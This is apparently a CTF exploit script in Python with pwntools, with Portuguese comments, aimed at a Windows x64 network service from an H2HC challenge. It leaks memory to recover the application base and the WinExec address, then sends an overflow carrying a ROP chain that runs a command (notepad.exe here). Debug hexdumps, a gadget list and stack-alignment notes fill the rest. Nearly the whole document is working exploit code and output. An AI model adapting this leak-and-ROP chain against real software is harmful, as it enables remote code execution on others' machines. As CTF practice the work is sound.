#!/usr/bin/python
# -*- coding: utf-8 -*-
'''
Aplicação H2HC criado para CTF
Exploit criado por M4v3r1ck (helvio_junior[at]hotmail[dot]com)
'''

from pwn import *
import os
import posix
from struct import *
import sys
from threading import Thread
from subprocess import Popen, PIPE
from copy import copy
 
context(arch='amd64', os='windows', log_level='debug')

host= "192.168.255.202"
port = 54345

payload  = "\x10" * 256
payload += "\x04" #'e unsigned, este valor e multiplicado por 8 ent~ao tenho valor maximo de 2040
payload += "\x09"
payload += "\x00" * (2)

buffer  = "H2HC" #cookie 
buffer += "\x00\x01\x00\x00" #size to trigger the vul
buffer += payload
#buffer += "\x0a"

#Estagio 01
payload1  = "H2HC" #cookie 
payload1 += "\xff\x00\x00\x00" #size to trigger the vul
payload1 += "\x41" * 0xff
payload1 += "\n"


p = remote(host, port)
p.send(payload1)
print p.recv(4096)
p.close()

'''
[DEBUG] Received 0xa02 bytes:
    00000000  5b 2b 5d 20  48 32 48 43  31 39 20 6d  65 73 73 61  │[+] │H2HC│19 m│essa│
    00000010  67 65 3a 20  10 10 10 10  10 10 10 10  10 10 10 10  │ge: │····│····│····│
    00000020  10 10 10 10  10 10 10 10  10 10 10 10  10 10 10 10  │····│····│····│····│
    *
    00000110  10 10 10 10  02 09 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000120  6b 1a 40 63  f6 7f 00 00  5d 16 40 63  f6 7f 00 00  │k·@c│····│]·@c│····│
    00000130  f0 15 40 63  f6 7f 00 00  fe 14 40 63  f6 7f 00 00  │··@c│····│··@c│····│
    00000140  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000910  00 00 00 00  00 00 00 00  90 f0 7e 0a  fa 7f 00 00  │····│····│··~·│····│
    00000920  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000930  00 00 00 00  0d 00 00 00  10 3f 25 01  00 00 00 00  │····│····│·?%·│····│
    00000940  00 00 00 00  00 00 00 00  00 00 00 ce  b1 30 2c 01  │····│····│····│·0,·│
    00000950  00 00 00 00  01 00 00 00  00 1f 25 01  00 00 00 00  │····│····│··%·│····│
    00000960  00 00 00 00  00 00 00 00  80 1f 25 01  00 00 00 00  │····│····│··%·│····│
    00000970  80 1f 25 01  00 00 00 00  00 00 00 00  00 00 00 00  │··%·│····│····│····│
    00000980  00 00 00 00  00 00 00 00  80 f4 40 63  f6 7f 00 00  │····│····│··@c│····│
    00000990  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000a00  00 00                                               │··│
    00000a02
'''

p1 = remote(host, port)
p1.send(buffer)
p1.recvuntil("H2HC19 message:")

# Teremos que fazer 2 leaks, um deles para o endereço dentro do código da aplicação e o outro para o endereço onde está o winexec para posteriormente fazermos um POP POP RET
p1.recv(0x10d) #ate o leak do endereço 6b 1a 40 63  f6 7f 00 00
ld1 = p1.recv(8)

leak_local_addr  = u64(ld1.ljust(8, "\x00"))
base_addr = leak_local_addr & 0xffffffffffff0000


log.info("Local leak   : %s" % hex(leak_local_addr))
log.info("App Base Addr   : %s" % hex(base_addr))

p1.recv(0x7f0) #offset entre a posição zero até o 90 f0 7e 0a  fa 7f 
lead_data = p1.recv(8)
data = p1.recv(4096)
print hexdump(data)

leak  = u64(lead_data.ljust(8, "\x00"))

log.info("WinExec addr leak   : %s" % hex(leak))


#Estágio 3 - Redirecting
payload3  = "H2HC" #cookie 
payload3 += "\x00\x01\x00\x00" #size to trigger the vul
payload3 += "\x10" * 256
payload3 += "\x01" #'e unsigned, este valor e multiplicado por 8 ent~ao tenho valor maximo de 2040
payload3 += "\x10" * (3)
payload3 += "\x41" * (8)


'''
0x000000014000464f : nop ; ret
0x00000001400016e0 : mov rcx, rdi ; call r14
0x00000001400086ba : pop r14 ; ret
0x0000000140001aa5 : pop rdi ; ret
0x00000001400086ba : pop r14 ; ret
0x00000001400016e0 : mov rcx, rdi ; call r14
0x00000001400046e2 : mov rax, rcx ; ret
0x00000001400021a9 : push rsp ; and al, 0x20 ; call rax
0x0000000140001aa5 : pop rdi ; ret
0x00000001400086ba : pop r14 ; ret
0x00000001400016e0 : mov rcx, rdi ; call r14
0x0000000140005bea : add edi, r15d ; ret
0x0000000140004b59 : pop r15 ; pop r13 ; pop r12 ; ret
0x0000000140005c0f : add ecx, edi ; ret
0x0000000140007cc8 : mov rax, r11 ; ret
0x0000000140005c14 : add eax, r15d ; ret
0x0000000140006e1d : mov rcx, rax ; call r12
0x0000000140005bfe : cld ; ret
0x000000014000464f : nop ; ret

0x0000000140001b4b : mov rdx, r13 ; add rax, r15 ; call rax
0x0000000140006e8c : mov rdx, r13 ; mov rcx, rbx ; call rax
0x0000000140006e1b : push rcx ; cmc ; mov rcx, rax ; call r12
0x0000000140008b4d : emms ; retf
0x0000000140005c16 : clc ; ret
0x0000000140005c0a : cli ; ret

#Instrução para ajustar a simetria para 16 byts
0x000000014000166a : add esp, 0x28 ; ret


Antes da adiçao de 0x28, podemos ver que a pilha não está alinhada a 16 bytes
>>> hex(0x000000000073FC98 & 0xFFFFFFFFFFFFFFF0)
'0x73fc90L'

Mas se inserir 0x28, a pinha fica alinhada
>>> inc=0x28
>>> hex(((0x000000000073FC98 + inc) & 0xFFFFFFFFFFFFFFF0))
'0x73fcc0L'
>>> hex(((0x000000000073FC98 + inc)))
'0x73fcc0'


Exemplo antes do add esp, 28
000000000073FC98  0000000000000000  
000000000073FCA0  0000000000000000  
000000000073FCA8  0000000000000000  
000000000073FCB0  0000000000000000  
000000000073FCB8  0000000000000000  
000000000073FCC0  00007FF7B7DA6E1D  h2hc.00007FF7B7DA6E1D
000000000073FCC8  0000000000000000  
000000000073FCD0  6F646E69575C3A63  
000000000073FCD8  65747379535C7377  
000000000073FCE0  65746F6E5C32336D  
000000000073FCE8  006578652E646170  
000000000073FCF0  0000000000000000  
000000000073FCF8  0000000000000000  
000000000073FD00  0000000000000000  
000000000073FD08  0000000000000000  
000000000073FD10  0000000000000000  
000000000073FD18  0000000000000000  
000000000073FD20  0000000000000000  


Após
000000000073FCC0  00007FF7B7DA6E1D  h2hc.00007FF7B7DA6E1D
000000000073FCC8  0000000000000000  
000000000073FCD0  6F646E69575C3A63  
000000000073FCD8  65747379535C7377  
000000000073FCE0  65746F6E5C32336D  
000000000073FCE8  006578652E646170  
000000000073FCF0  0000000000000000  
000000000073FCF8  0000000000000000  


Retorno do Winexec
ERROR_SUCCESS = 32
ERROR_NO_ASSOC = 31
ERROR_OUT_OF_MEM = 0
ERROR_FILE_NOT_FOUND = 2
ERROR_PATH_NOT_FOUND = 3
ERROR_BAD_FORMAT = 11
'''

payload3 += p64(base_addr + 0x0464f) # NOP RET para saltar para depois do alinhamento

payload3 += "\x41" * (4) # Alinhamento
payload3 += "\x42" * (8) # Trash


#ROP Chain
'''
Premissas para funcionar:
1 - O Comando tem de estar a frente da posição da pilha (ou 128 bytes antes) no momento do call da WinExec, 
    pois dentro da chamada da winexec ele utiliza alguns bytes anteriores a posição atual da stack, causando
    a substituição do nosso comando
2 - O Endereço do comando tem de estar alinhado a 16 bytes
    para saber se o endereço está alinhado basta realizar o calculo (endereço & 0xfffffffffffffff0)
3 - O Endereço da pilha no momento da chamada do call da WinExec tem de estar alinhado a 16 bytes
4 - Na Pilha tem de ter o equivalente a 3 parâmetros como Shadow data (3 * 8 bytes)
5 - Na quarta posição da pilha tem de haver um endereço válido da aplicação (não é efetivamente usado 
    mas dentro da WinExec ele cacula alguma coisa com este endereço e se for inválido da exception)
'''

base_offset = 928 # esse offset calcula de forma que o apontamento chegue a primeira instrução do ROP Chain abaixo

rop_chain2  = p64(leak) # WinExec --> Endereço que será chamado pelo call r12
rop_chain2 += p64(base_addr + 0x05c14) # add eax, r15d ; ret
rop_chain2 += p64(base_addr + 0x0166a) # add esp, 0x28 ; ret --> Ajusta o alinhamento a 16 bytes
rop_chain2 += "\x41" * 0x28
rop_chain2 += p64(base_addr + 0x0464f) # nop ; ret
rop_chain2 += p64(base_addr + 0x06e1d) # mov rcx, rax ; call r12
rop_chain2 += "\x00" * (8*3) # Shadow Data
rop_chain2 += p64(base_addr + 0x0464f) # NOP RET --> Será usado pela função WinExec
rop_chain2 += "\x00" * (8*10) # Padding
rop_chain2 += "\x00" * ((len(rop_chain2) + (8 * 4)) % 16) # Calcula simetria de 16 bytes


rop_chain1  = p64(base_addr + 0x07cc8) # mov rax, r11 ; ret
rop_chain1 += p64(base_addr + 0x04b59) # pop r15 ; pop r13 ; pop r12 ; ret
rop_chain1 += p64(base_offset + len(rop_chain2) + (8 * 4)) # Numero a ser adicionado em rax
rop_chain1 += "\x41" * 8

cmd = "notepad.exe"

payload3 += rop_chain1 + rop_chain2 + cmd + "\x00"

p2 = remote(host, port)
p2.send(payload3)

p2.interactive()

